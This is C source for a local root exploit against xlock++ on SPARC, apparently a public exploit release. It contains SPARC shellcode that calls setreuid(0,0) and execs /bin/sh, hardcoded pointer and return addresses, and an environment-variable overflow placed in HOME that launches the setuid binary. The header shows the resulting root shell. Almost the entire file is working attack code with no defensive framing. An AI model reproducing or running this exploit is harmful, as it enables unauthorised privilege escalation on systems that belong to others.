/* [xlock++ (sparc) local root exploit by eSDee (esdee@netric.org)]
   bug found by gloomy (gloomy@root66.org)
   ----------------------------------------------------------------
   yeh, i know.. this one is probally really old :-)
   ----------------------------------------------------------------
   ptr1 : 0xffbee5e0 (ptr -> ptr2)
   ptr2 : 0xffbee890 (ptr -> ret)
   ret  : 0xffbefa50 (ptr -> shellcode)
   dummy: 0xffbeec68 (just a valid pointer)
   ----------------------------------------------------------------
   # id; 
   uid=0(root) gid=0(root)
   #
*/

#define PATH "/usr/local/bin/xlock++"
#define ALLIGN 0

#include <stdio.h>

char
shellcode[] = /* setreuid(0,0);  execve("/bin//sh", &argv[0], NULL); exit(); */

        // setreuid(0,0);

        "\x90\x1d\x80\x16"      // xor  %l6, %l6, %o0
        "\x92\x1d\x80\x16"      // xor  %l6, %l6, %o1
        "\x82\x10\x20\xca"      // mov  0xca, %g1
        "\x91\xd0\x20\x08"      // ta  8

        // execve("/bin//sh", &argv[0], NULL);

	"\x21\x0b\xd8\x9a"	// sethi  %hi(0x2f626800), %l0
        "\xa0\x14\x21\x6e"      // or  %l0, 0x16e, %l0     ! 0x2f62696e
        "\x23\x0b\xcb\xdc"      // sethi  %hi(0x2f2f7000), %l1
        "\xa2\x14\x63\x68"      // or  %l1, 0x368, %l1     ! 0x2f2f7368
        "\xe0\x3b\xbf\xf0"      // std  %l0, [ %sp + -16 ]
        "\xc0\x23\xbf\xf8"      // clr  [ %sp + -8 ]
        "\x90\x23\xa0\x10"      // sub  %sp, 0x10, %o0
        "\xc0\x23\xbf\xec"      // clr  [ %sp + -20 ]
        "\xd0\x23\xbf\xe8"      // st  %o0, [ %sp + -24 ]
        "\x92\x23\xa0\x18"      // sub  %sp, 0x18, %o1
        "\x94\x22\x80\x0a"      // sub  %o2, %o2, %o2
        "\x82\x10\x20\x3b"      // mov  0x3b, %g1
        "\x91\xd0\x20\x08"      // ta  8

        // exit()

        "\x82\x10\x20\x01"      // mov  1, %g1
        "\x91\xd0\x20\x08";     // ta  8

long
get_sp()
{
        __asm("mov %sp,%i0");
}

int
main(int argc, char *argv[])
{
        char buffer[1500];
        char env[2000];

        unsigned long ptr1      = 0xffbee5e0;
        unsigned long ptr2      = 0xffbee890;
        unsigned long ret       = 0xffbefa50;
        unsigned long dummy     = get_sp();     /* must be a valid pointer*/
        unsigned long nop       = 0x901d8016;
        int i = 0;

        if (argc > 1) ptr1      = strtoul(argv[1], &argv[1], 16);
        if (argc > 2) ptr2      = strtoul(argv[2], &argv[2], 16);
        if (argc > 3) ret       = strtoul(argv[3], &argv[3], 16);
        if (argc > 4) dummy     = strtoul(argv[4], &argv[4], 16);

        memset(buffer, 0x41, sizeof(buffer));
        memset(env,    0x41, sizeof(env));

        memcpy(buffer, "HOME=", 5);
        memcpy(env,    "FLOP=", 5);

        for (i= 5 + ALLIGN; i < sizeof(env) - 4; i +=4) memcpy(env+i, &nop,4);
        memcpy(env + 1803 + ALLIGN,shellcode, strlen(shellcode));
        env[sizeof(env) - 1] = 0x0;

        for (i= 5   + ALLIGN; i < 700; i+=4)  memcpy(buffer+i, &ptr2,4);
        for (i= 701 + ALLIGN; i < 1400; i+=4) memcpy(buffer+i, &ret,4);

        memcpy(buffer+1321, shellcode, strlen(shellcode));

        buffer[1033] = (ptr1 >> 24) & 0xff;
        buffer[1034] = (ptr1 >> 16) & 0xff;
        buffer[1035] = (ptr1 >> 8)  & 0xff;
        buffer[1036] = (ptr1)       & 0xff;

        buffer[1045] = (dummy >> 24) & 0xff;
        buffer[1046] = (dummy >> 16) & 0xff;
        buffer[1047] = (dummy >> 8)  & 0xff;
        buffer[1048] = (dummy)       & 0xff;

        buffer[1400] = 0x0;
        putenv(env);
        putenv(buffer);

        fprintf(stdout, "[xlock++ (sparc) local root exploit by eSDee (esdee@netric.org)]\n"
                        "----------------------------------------------------------------\n"
                        "ptr1 : 0x%08x (ptr -> ptr2)\n"
                        "ptr2 : 0x%08x (ptr -> ret)\n"
                        "ret  : 0x%08x (ptr -> shellcode)\n"
                        "dummy: 0x%08x (just a valid pointer)\n"
                        "----------------------------------------------------------------\n",
                        ptr1,ptr2,ret,dummy);

        execl(PATH, "xlock++", NULL);
        return 0;
}
